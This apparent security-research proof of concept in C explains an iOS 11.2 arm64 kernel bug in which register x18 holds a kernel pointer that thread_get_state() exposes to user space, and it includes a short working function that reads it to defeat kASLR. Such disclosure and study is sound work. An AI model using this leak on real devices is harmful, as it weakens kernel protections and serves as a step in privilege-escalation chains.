/*
 * x18-leak
 * Brandon Azad
 *
 *
 * x18-leak
 * ================================================================================================
 *
 * In iOS 11.2, Apple introduced a feature on arm64 called __ARM_KERNEL_PROTECT__. According to a
 * comment in osfmk/arm64/proc_reg.h:
 *
 * 	__ARM_KERNEL_PROTECT__ is a feature intended to guard against potential
 * 	architectural or microarchitectural vulnerabilities that could allow cores to
 * 	read/access EL1-only mappings while in EL0 mode.  This is achieved by
 * 	removing as many mappings as possible when the core transitions to EL0 mode
 * 	from EL1 mode, and restoring those mappings when the core transitions to EL1
 * 	mode from EL0 mode.
 *
 * That is, when transitioning from EL1 (kernel mode) to EL0 (user mode), as many kernel mappings
 * as possible will be removed. This should limit the possible attack surface against kernel memory
 * mappings when exploiting microarchitectural vulnerabilities like Spectre or Meltdown.
 *
 * If you look through the diff between XNU versions 4570.20.62 and 4570.31.3, you'll find a number
 * of new references to register x18 pop up in the file osfmk/arm64/locore.s in relation to
 * __ARM_KERNEL_PROTECT__. In particular, you'll see that the exception vector
 * Lel0_synchronous_vector_64, which is the exception vector invoked on a system call (instruction
 * "svc #0"), now looks like this:
 *
 * 		.text
 * 		.align 7
 * 	Lel0_synchronous_vector_64:
 * 		MAP_KERNEL
 * 		BRANCH_TO_KVA_VECTOR Lel0_synchronous_vector_64_long, 8
 *
 * The macro BRANCH_TO_KVA_VECTOR is defined as:
 *
 * 	.macro BRANCH_TO_KVA_VECTOR
 * 	#if __ARM_KERNEL_PROTECT__
 * 		/@
 * 		 * Find the kernelcache table for the exception vectors by accessing
 * 		 * the per-CPU data.
 * 		 @/
 * 		mrs		x18, TPIDR_EL1
 * 		ldr		x18, [x18, ACT_CPUDATAP]
 * 		ldr		x18, [x18, CPU_EXC_VECTORS]
 *
 * 		/@
 * 		 * Get the handler for this exception and jump to it.
 * 		 @/
 * 		ldr		x18, [x18, #($1 << 3)]
 * 		br		x18
 * 	#else
 * 		b		$0
 * 	#endif /@ __ARM_KERNEL_PROTECT__ @/
 * 	.endmacro
 *
 * This macro performs an indirect branch to the true exception vector implementation,
 * Lel0_synchronous_vector_64_long, by loading a pointer to that function into the register x18.
 * Notice, however, that this clobber of x18 happens before the userspace registers are saved by
 * the function fleh_dispatch64, which is called by Lel0_synchronous_vector_64_long. This means
 * that when the user registers are saved, x18 will actually be a pointer to
 * Lel0_synchronous_vector_64_long rather than the original value from userspace.
 *
 * Even though x18 is cleared on exception return, storing a kernel pointer in the user register
 * state is problematic because thread_get_state() can be used to copy the saved user register
 * state back to userspace, including the value of register x18. All a thread needs to do in order
 * to obtain the address of the Lel0_synchronous_vector_64_long function is call thread_get_state()
 * on itself and look at the reported value of x18. This makes it trivial to determine the kASLR
 * slide by subtracting the value of x18 thus obtained by the static address of
 * Lel0_synchronous_vector_64_long.
 *
 */
#include "x18_leak.h"

#include <mach/mach.h>

uint64_t
x18_leak() {
	mach_port_t thread = mach_thread_self();
	arm_thread_state64_t state;
	mach_msg_type_number_t count = ARM_THREAD_STATE64_COUNT;
	kern_return_t kr = thread_get_state(thread, ARM_THREAD_STATE64,
			(thread_state_t) &state, &count);
	mach_port_deallocate(mach_task_self(), thread);
	if (kr != KERN_SUCCESS) {
		return 0;
	}
	if ((state.__x[18] & 0xffffffff00000000) != 0xfffffff000000000) {
		return 0;
	}
	return state.__x[18];
}
